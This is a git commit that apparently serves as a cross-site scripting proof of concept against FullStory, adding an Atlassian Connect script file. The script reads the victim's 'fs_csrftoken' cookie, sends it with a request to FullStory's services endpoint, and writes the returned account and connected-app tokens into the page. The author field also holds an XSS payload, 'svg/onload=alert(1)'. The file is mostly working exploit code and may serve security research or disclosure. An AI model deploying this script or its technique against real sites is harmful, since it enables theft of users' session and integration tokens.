de9d7e50dd642366a9d4bd94f4e774e958d2d6b6
svg/onload=alert(1) <mangoiscat@gmail.com>
2019-05-04 23:13:38 +0530

    Create all.js

---
+++ atlassian-connect/all.js
@@ -0,0 +1,31 @@
+alert(document.domain);
+
+function getCsrfToken() {
+      var cookies = document['cookie'].split(';');
+      for (var i = 0; i < cookies.length; i++) {
+        var part = cookies[i].trim();
+        if (part.indexOf('fs_csrftoken') == 0) {
+          return part.substring('fs_csrftoken='.length, part.length);
+        }
+      }
+      return null;
+    }
+
+
+
+var xhr = new XMLHttpRequest();
+
+xhr.open("GET", "https://app.fullstory.com/souq/services", true);
+
+var csrfToken = getCsrfToken();
+if (csrfToken) {
+    xhr.setRequestHeader("Csrftoken", csrfToken);
+}
+alert('your CSRF token: '+csrfToken);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4) {
+      document.write('<h1>All your tokens to access your account and all your connected apps token</h1><br>'+xhr.response);
+    }
+  }
+
+xhr.send();
